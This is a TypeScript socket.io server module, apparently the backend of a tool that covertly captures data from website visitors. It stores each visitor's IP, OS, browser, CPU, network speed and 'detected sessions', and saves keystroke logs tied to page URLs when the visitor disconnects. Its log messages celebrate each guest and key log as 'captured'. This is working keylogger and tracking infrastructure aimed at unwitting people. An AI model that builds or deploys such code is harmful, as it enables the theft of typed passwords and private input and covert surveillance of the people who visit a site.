import { Socket } from "socket.io"
import { UAParser } from "ua-parser-js"

import { Guest } from "./datastore"
import log from '../bin/logger'


export default async (socket:Socket) => {
    const ip = socket.handshake.headers['x-forwarded-for'] || socket.handshake.address
    const sessionId = socket.id
    const keyLog:KeyLog = {url: '', log: '', date: new Date()}

    socket.on('new guest', () => socket.join('guests'))

    socket.on('general info', async (info:GeneralInfo) => {
        const guest:Guest = await Guest.findOne({ ip })
        const navigator = new UAParser(info.userAgent)

        if (guest) {
            Object
                .entries(info)
                .forEach(([key, value]) => { if (key !== 'userAgent') guest[key] = value })

            guest.sessionId = sessionId
            guest.os = `${navigator.getOS().name} ${navigator.getOS().version}`,
            guest.browser = `${navigator.getBrowser().name} ${navigator.getBrowser().version}`,
            guest.browserEngine = `${navigator.getEngine().name} ${navigator.getEngine().version}`,
            guest.cpuArch = navigator.getCPU().architecture

            log(guest, 'new guest is captured!')
            await guest.store()
        }
    })

    socket.on('network speed', async (networkSpeed:NetworkSpeedObj) => {
        const guest:Guest = await Guest.findOne({ ip })

        if (guest) {
            guest.networkSpeed = networkSpeed

            log(guest, `guest's network speed is detected:`, networkSpeed)
            await guest.store()
        }
    })

    socket.on('key log', (url:string, log:string) => {
        keyLog.url = url
        keyLog.log = log
    })

    socket.on('detected sessions', async (sessions:Sessions) => {
        const guest:Guest = await Guest.findOne({ ip })

        if (guest) {
            guest.sessions = sessions

            log(guest, `guest's active sessions was detected:`, sessions)
            await guest.store()
        }
    })

    socket.on('disconnect', async () => {
        const guest:Guest = await Guest.findOne({ ip })

        if (guest && keyLog.log) {
            guest.keyLogs.push(keyLog)
            log(guest, `guest's key log was captured for ${keyLog.url}:`, keyLog.log)
            await guest.store()
        }
    })
}
